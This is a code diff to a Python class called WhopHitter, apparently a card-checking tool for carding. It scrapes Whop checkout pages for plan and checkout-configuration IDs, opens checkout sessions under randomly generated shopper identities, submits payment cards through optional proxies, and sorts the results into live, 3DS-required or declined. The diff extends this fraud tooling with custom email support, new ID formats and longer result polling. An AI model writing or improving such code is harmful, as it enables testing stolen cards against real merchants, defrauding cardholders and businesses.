@@ -159,24 +159,29 @@ class WhopHitter:
         "issuer_unavailable": "issuer_unavailable",
     }
 
-    def __init__(self, url: str, proxy_data: Optional[dict] = None):
+    def __init__(self, url: str, proxy_data: Optional[dict] = None, email: Optional[str] = None):
         self.url = url.strip()
         if not self.url.startswith(("http://", "https://")):
             self.url = f"https://{self.url}"
         self.proxy_data = proxy_data
+        self.custom_email = email.strip() if email else None
         self._base_cfg: Optional[dict] = None
 
-    def _parse_url(self) -> Tuple[Optional[str], Optional[str]]:
+    def _parse_url(self) -> Tuple[Optional[str], Optional[str], Optional[str]]:
         parsed = urlparse(self.url)
         params = parse_qs(parsed.query)
         path_parts = [p for p in parsed.path.split("/") if p]
         plan_id = None
+        checkout_config = None
         for p in path_parts:
             if p.startswith("plan_"):
                 plan_id = p
                 break
+            elif p.startswith("ch_"):
+                checkout_config = p
+                break
         session_id = params.get("session", [None])[0]
-        return plan_id, session_id
+        return plan_id, checkout_config, session_id
 
     async def _scrape(self, session: AsyncSession) -> dict:
         hdr = {
@@ -188,15 +193,18 @@ class WhopHitter:
             'merchant': 'Whop Merchant',
             'product_id': None,
             'plan_id': None,
+            'checkout_configuration': None,
             'account_id': None,
             'amount': None,
             'currency': 'USD',
             'email': None,
         }
 
-        plan_id_url, _ = self._parse_url()
+        plan_id_url, ch_config_url, _ = self._parse_url()
         if plan_id_url:
             cfg['plan_id'] = plan_id_url
+        if ch_config_url:
+            cfg['checkout_configuration'] = ch_config_url
 
         try:
             res = await session.get(self.url, headers=hdr, timeout=15)
@@ -207,11 +215,15 @@ class WhopHitter:
             if biz_m:
                 cfg['account_id'] = biz_m.group(0)
 
-            # 2. Resolve Plan ID if not found in URL path
-            if not cfg['plan_id']:
+            # 2. Resolve Plan ID or Checkout Configuration if not found in URL path
+            if not cfg['plan_id'] and not cfg['checkout_configuration']:
                 plan_m = re.search(r"plan_[A-Za-z0-9_]{10,24}", html)
                 if plan_m:
                     cfg['plan_id'] = plan_m.group(0)
+                else:
+                    ch_m = re.search(r"ch_[A-Za-z0-9_]{10,24}", html)
+                    if ch_m:
+                        cfg['checkout_configuration'] = ch_m.group(0)
 
             # 3. Resolve Email if embedded
             email_m = re.search(r'"email"\s*:\s*"([^"]+)"', html)
@@ -248,17 +260,23 @@ class WhopHitter:
                     result['receipt_url'] = d.get('receipt_url') or d.get('redirect_url') or self.url
                     return result
 
-                if status in ('requires_action', 'requires_source_action') or 'next_action' in d or 'next_action' in pay:
+                next_act = d.get('next_action') or pay.get('next_action') or {}
+                next_type = next_act.get('type')
+                redirect_url = next_act.get('redirect_to_url', {}).get('url') or next_act.get('url')
+
+                if status in ('requires_action', 'requires_source_action') or redirect_url or next_type in ('redirect_to_url', 'three_ds', '3ds'):
                     result['decline_code'] = '3ds_required'
                     result['error'] = '3DS Authentication Required'
                     result['is_live'] = True
-                    next_act = d.get('next_action') or pay.get('next_action') or {}
-                    redirect_url = next_act.get('redirect_to_url', {}).get('url')
                     if redirect_url:
                         result['redirect_url'] = redirect_url
                     return result
 
-                err = d.get('last_confirm_error') or d.get('error') or d.get('message')
+                # If the payment is still processing asynchronously via wait_for_payment, don't finalize decline code yet
+                if status == 'processing' or next_type == 'wait_for_payment':
+                    return result
+
+                err = d.get('last_confirm_error') or d.get('error') or d.get('message') or d.get('blocking_error')
                 if isinstance(err, dict):
                     msg = err.get('message') or err.get('code') or 'Card declined'
                     dec_code = err.get('decline_code') or err.get('code') or 'card_declined'
@@ -301,8 +319,8 @@ class WhopHitter:
             result['is_live'] = True
             return result
 
-        result['decline_code'] = 'card_declined'
-        result['error'] = 'Your card was declined.'
+        result['decline_code'] = result.get('decline_code') or 'card_declined'
+        result['error'] = result.get('error') or 'Your card was declined.'
         return result
 
     async def hit(self, card: dict, attempt: int, user_id: int) -> dict:
@@ -329,14 +347,15 @@ class WhopHitter:
                 result['merchant'] = cfg.get('merchant', 'Whop Merchant')
 
                 plan_id = cfg.get('plan_id')
-                if not plan_id:
+                ch_config = cfg.get('checkout_configuration')
+                if not plan_id and not ch_config:
                     result['decline_code'] = 'invalid_plan'
-                    result['error'] = 'Unable to resolve Whop Plan ID from link.'
+                    result['error'] = 'Unable to resolve Whop Plan or Checkout Configuration from link.'
                     result['response_time'] = round(time.time() - t0, 2)
                     return result
 
                 shopper = _generate_random_shopper('US')
-                shopper_email = cfg.get('email') or shopper['email']
+                shopper_email = self.custom_email or cfg.get('email') or shopper['email']
 
                 # ── 2. Create Whop Checkout Session ──────────────────────────
                 whop_headers = {
@@ -352,10 +371,17 @@ class WhopHitter:
                     "Referer": self.url,
                 }
 
+                if ch_config:
+                    session_payload = {"checkout_configuration": ch_config}
+                    if plan_id:
+                        session_payload["items"] = [{"plan": plan_id, "quantity": 1}]
+                else:
+                    session_payload = {"items": [{"plan": plan_id, "quantity": 1}]}
+
                 r_cs = await sess.post(
                     f"{WHOP_API_BASE}/checkout_sessions",
                     headers=whop_headers,
-                    json={"items": [{"plan": plan_id, "quantity": 1}]},
+                    json=session_payload,
                     timeout=20
                 )
                 if r_cs.status_code not in (200, 201):
@@ -537,8 +563,8 @@ class WhopHitter:
                 parsed = self._parse_response(conf_resp_text, r_confirm.status_code, result)
 
                 # ── 8. Async Polling Fallback if Still Processing ────────────
-                if not parsed.get('success') and not parsed.get('decline_code') and not parsed.get('error'):
-                    for _ in range(4):
+                if not parsed.get('success') and not parsed.get('decline_code'):
+                    for _ in range(6):
                         await asyncio.sleep(2.5)
                         r_poll = await sess.get(
                             f"{WHOP_API_BASE}/checkout_sessions/{checkout_id}",
@@ -550,6 +576,10 @@ class WhopHitter:
                         parsed = self._parse_response(poll_text, r_poll.status_code, result)
                         if parsed.get('success') or parsed.get('decline_code'):
                             break
+
+                if not result.get('success') and not result.get('decline_code'):
+                    result['decline_code'] = 'card_declined'
+                    result['error'] = 'Payment processing timed out or was declined.'
 
                 result['response_time'] = round(time.time() - t0, 2)
                 return result
